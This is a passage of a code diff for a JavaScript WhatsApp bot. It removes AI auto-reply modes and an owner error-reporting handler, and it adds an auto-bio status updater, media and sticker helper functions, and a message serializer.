-        const _cbaAutoReply = await _runChatBoAI(budy, true)
-        reply(`${_cbaAutoReply}`)
-    } catch (e) {
-        console.log('[ChatBoAI-Auto] Error:', e.message || e)
-    }
-}
-
-// ── ChatBot global auto-reply (.chatbot on/off) — uses _runChatBoAI ──
-if (global.chatBot && budy && !budy.startsWith('>') && !budy.startsWith('=>') && !budy.startsWith('$') && !isCmd && !m.key.fromMe && !(global.chatBoAIChats && global.chatBoAIChats[m.chat])) {
-    try {
-        const _cbReply = await _runChatBoAI(budy, true)
-        if (_cbReply?.trim()) {
-            reply(_cbReply.trim())
-        } else {
-            reply('❌ AI is unavailable right now. Try again in a moment.')
-        }
-    } catch (chatErr) {
-        console.log('[ChatBot] Error:', chatErr.message || chatErr)
-    }
-}
-
-// ── AI ChatBot — Separate DM / Group / Global Modes (.setaimode) ────────
-// Skip if already handled by chatBoAIChats or chatBot, or if it's a command
-if (!isCmd && budy && !m.key.fromMe && !(global.chatBoAIChats && global.chatBoAIChats[m.chat]) && !global.chatBot) {
-    let _aiShouldReply = false
-
-    // 1. Global mode — reply everywhere
-    if (global.aiBotGlobal) {
-        _aiShouldReply = true
-    }
-
-    // 2. DM mode — reply in private chats
-    if (!_aiShouldReply && global.aiBotDM && !m.isGroup) {
-        // If specific DM whitelist is set, only reply to those numbers
-        const _dmKeys = Object.keys(global.aiBotDMChats || {})
-        if (_dmKeys.length > 0) {
-            _aiShouldReply = !!global.aiBotDMChats[from]
-        } else {
-            // No whitelist = reply to ALL DMs
-            _aiShouldReply = true
-        }
-    }
-
-    // 3. Group mode — reply in whitelisted groups
-    if (!_aiShouldReply && global.aiBotGroup && m.isGroup) {
-        _aiShouldReply = !!(global.aiBotGroupChats && global.aiBotGroupChats[from])
-    }
-
-    if (_aiShouldReply) {
+//━━━━━━━━━━━━━━━━━━━━━━━━//
+// Auto Bio Handler
+let autoBioInterval = null
+function startAutoBio() {
+    if (autoBioInterval) clearInterval(autoBioInterval)
+    autoBioInterval = setInterval(async () => {
+        if (!global.autoBio) return
         try {
-            const _modeLabel = global.aiBotGlobal ? '🌐' : m.isGroup ? '👥' : '📨'
-            await X.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })
-            const _modeReply = await _runChatBoAI(budy, true)
-            if (_modeReply?.trim()) reply(_modeReply.trim())
-        } catch (_modeErr) {
-            console.log('[AI-Mode] Error:', _modeErr.message || _modeErr)
+            let tz = global.botTimezone || 'Africa/Nairobi'
+            let timeStr = moment().tz(tz).format('HH:mm:ss')
+            let dateStr = moment().tz(tz).format('DD/MM/YYYY')
+            await X.updateProfileStatus(`${global.botname} | ${timeStr} | ${dateStr}`)
+        } catch (err) {
+            console.log('[Auto-Bio] Error:', err.message || err)
         }
-    }
+    }, 60000)
 }
+startAutoBio()
+//━━━━━━━━━━━━━━━━━━━━━━━━//
+// Message Types
+X.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
+let quoted = message.msg ? message.msg : message
+let mime = (message.msg || message).mimetype || ''
+let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+const stream = await downloadContentFromMessage(quoted, messageType)
+let buffer = Buffer.from([])
+for await(const chunk of stream) {
+buffer = Buffer.concat([buffer, chunk])
+}
+let type = await FileType.fromBuffer(buffer)
+let trueFileName = attachExtension ? ('./tmp/' + filename + '.' + type.ext) : './tmp/' + filename
+await fs.writeFileSync(trueFileName, buffer)
+return trueFileName
+}
+
+X.sendStickerFromUrl = async(from, PATH, quoted, options = {}) => {
+let { writeExif } = require('./tmp')
+let types = await X.getFile(PATH, true)
+let { filename, size, ext, mime, data } = types
+let type = '', mimetype = mime, pathFile = filename
+if (/webp/.test(mime) || (/image/.test(mime) && options.asSticker)) type = 'sticker'
+else if (/image/.test(mime)) type = 'image'
+else if (/video/.test(mime)) type = 'video'
+else type = 'document'
+let msg = await X.sendMessage(from, { [type]: { url: pathFile }, mimetype, ...options }, { quoted })
+return msg
+}
+
+X.sendImageAsStickerAV = async (jid, path, quoted, options = {}) => {
+let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetch(path)).buffer() : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
+let buffer
+if (options && (options.packname || options.author)) {
+    buffer = await writeExifImgAV(buff, options)
+} else {
+    buffer = await imageToWebp(buff)
+}
+await X.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
+return buffer
+}
+
+X.sendVideoAsStickerAV = async (jid, path, quoted, options = {}) => {
+let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetch(path)).buffer() : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
+let buffer
+if (options && (options.packname || options.author)) {
+    buffer = await writeExifVid(buff, options)
+} else {
+    buffer = await videoToWebp(buff)
+}
+await X.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
+return buffer
+}
+
+X.downloadMediaMessage = async (message) => {
+let mime = (message.msg || message).mimetype || ''
+let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+const stream = await downloadContentFromMessage(message.msg || message, messageType)
+let buffer = Buffer.from([])
+for await (const chunk of stream) {
+buffer = Buffer.concat([buffer, chunk])
+}
+return buffer
+}
+
+X.getFile = async (PATH, save) => {
+    let res
+    let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await fetch(PATH)).buffer() : fs.existsSync(PATH) ? (data = fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
+    let type = await FileType.fromBuffer(data) || {
+        mime: 'application/octet-stream',
+        ext: '.bin'
+    }
+    let filename = path.join(__dirname, 'tmp', new Date * 1 + '.' + type.ext)
+    if (data && save) fs.promises.writeFile(filename, data)
+    return {
+        res,
+        filename,
+        size: await (data).length,
+        ...type,
+        data
+    }
 }
 
 } catch (err) {
-  let errMsg = (err.message || '').toLowerCase()
-  let errStack = err.stack || err.message || util.format(err)
-
-  // ── Silently ignore known non-critical WhatsApp protocol errors ──────────
-  const silentErrors = [
-    'no sessions',           // Signal protocol — no encryption session yet
-    'sessionerror',          // Signal session missing for this JID
-    'bad mac',               // Decryption mismatch — WhatsApp will retry
-    'failed to decrypt',     // E2E decryption failure — not our bug
-    'rate-overlimit',        // WA rate limit — will recover on its own
-    'connection closed',     // Temporary network drop
-    'connection lost',       // Network drop
-    'timed out',             // Request timeout — not fatal
-    'timedout',
-    'socket hang up',        // TCP socket issue
-    'econnreset',            // Connection reset by WA servers
-    'enotfound',             // DNS / network
-    'not-authorized',        // WA auth on specific request — not fatal
-    'item-not-found',        // WA node not found — e.g. deleted message
-    'invalid protocol',      // WA protocol mismatch — temporary
-    'stream errored',        // WA stream error — will auto-reconnect
-    'aborted',               // Request aborted
-  ]
-  const isSilent = silentErrors.some(e => errMsg.includes(e))
-
-  console.log('====== ERROR REPORT ======')
-  console.log(errStack)
-  console.log('==========================')
-
-  if (isSilent) {
-    // Log only — do NOT spam owner with known protocol noise
-    console.log(`[SILENT ERROR] ${err.message || 'Unknown'} — suppressed owner notification`)
-    return
-  }
-
-  // Only report real unexpected errors to owner
-  try {
-    let shortStack = errStack.length > 1500 ? errStack.slice(0, 1500) + '\n...(truncated)' : errStack
-    await X.sendMessage(`${owner}@s.whatsapp.net`, {
-      text: `⚠️ *ERROR REPORT*\n\n📌 *Message:* ${err.message || '-'}\n📂 *Stack:*\n${shortStack}`,
-      contextInfo: { forwardingScore: 9999999, isForwarded: true }
-    }, { quoted: m })
-  } catch (reportErr) {
-    console.log('[Error Reporter] Failed to send error to owner:', reportErr.message || reportErr)
-  }
+    console.error(`[connectSession] Error:`, err)
 }
 }
+
 //━━━━━━━━━━━━━━━━━━━━━━━━//
-// File Update
-let file = require.resolve(__filename)
-fs.watchFile(file, () => {
-fs.unwatchFile(file)
-console.log(`Update File : ${__filename}`)
-delete require.cache[file]
-require(file)
+// Message Serializer
+function smsg(X, m, store) {
+if (!m) return m
+let M = proto.WebMessageInfo
+if (m.key) {
+m.id = m.key.id
+m.isBaileys = m.id.startsWith('BAE5') && m.id.length === 16
+m.chat = m.key.remoteJid
+m.fromMe = m.key.fromMe
+m.isGroup = m.chat.endsWith('@g.us')
+m.sender = X.decodeJid(m.fromMe && X.user.id || m.participant || m.key.participant || m.chat || '')
+if (m.isGroup) m.participant = X.decodeJid(m.key.participant) || ''
+}
+if (m.message) {
+m.mtype = getContentType(m.message)
+m.msg = (m.mtype == 'viewOnceMessage' ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype])
+m.body = m.message.conversation || m.msg.caption || m.msg.text || (m.mtype == 'listResponseMessage') && m.msg.singleSelectReply.selectedRowId || (m.mtype == 'buttonsResponseMessage') && m.msg.selectedButtonId || (m.mtype == 'viewOnceMessage') && m.msg.caption || m.text
+let quoted = m.quoted = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null
+m.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : []
+if (m.quoted) {
+let type = getContentType(quoted)
+m.quoted = m.quoted[type]
+if (['productMessage'].includes(type)) {
+type = getContentType(m.quoted)
+m.quoted = m.quoted[type]
+}
+if (typeof m.quoted === 'string') m.quoted = {
+text: m.quoted
+}
+m.quoted.mtype = type
+m.quoted.id = m.msg.contextInfo.stanzaId
+m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat
+m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith('BAE5') && m.quoted.id.length === 16 : false
+m.quoted.sender = X.decodeJid(m.msg.contextInfo.participant)
+let quotedSenderJid = m.quoted.sender
+let botJidForQuoted = X.user && X.user.id ? X.decodeJid(X.user.id) : ''
+let botLidForQuoted = X.user && X.user.lid ? X.decodeJid(X.user.lid) : ''
+m.quoted.fromMe = (quotedSenderJid === botJidForQuoted) || (botLidForQuoted && quotedSenderJid === botLidForQuoted) || (typeof X.areJidsSameUser === 'function' && (X.areJidsSameUser(quotedSenderJid, botJidForQuoted) || (botLidForQuoted && X.areJidsSameUser(quotedSenderJid, botLidForQuoted))))
+m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || ''
+m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : []
+m.getQuotedObj = m.getQuotedMessage = async () => {
+if (!m.quoted.id) return false
+let q = await store.loadMessage(m.chat, m.quoted.id, X)
+return exports.smsg(X, q, store)
+}
+let vM = m.quoted.fakeObj = M.fromObject({
+key: {
+remoteJid: m.quoted.chat,
+fromMe: m.quoted.fromMe,
+id: m.quoted.id,
+...(m.isGroup ? { participant: m.quoted.sender } : {})
+},
+message: quoted,
+...(m.isGroup ? { participant: m.quoted.sender } : {})
 })
+m.quoted.delete = () => X.sendMessage(m.quoted.chat, { delete: vM.key })
+m.quoted.copyNForward = (jid, forceForward = false, options = {}) => X.copyNForward(jid, vM, forceForward, options)
+m.quoted.download = () => X.downloadMediaMessage(m.quoted)
+}
+}
+if (m.msg.url) m.download = () => X.downloadMediaMessage(m.msg)
+m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || ''
+m.reply = (text, chatId = m.chat, options = {}) => X.sendMessage(chatId, { text: text, ...options }, { quoted: m, ...options })
+m.copy = () => exports.smsg(X, M.fromObject(M.toObject(m)))
+return m
+}
+
+//━━━━━━━━━━━━━━━━━━━━━━━━//
+// Start the bot
+startBot()
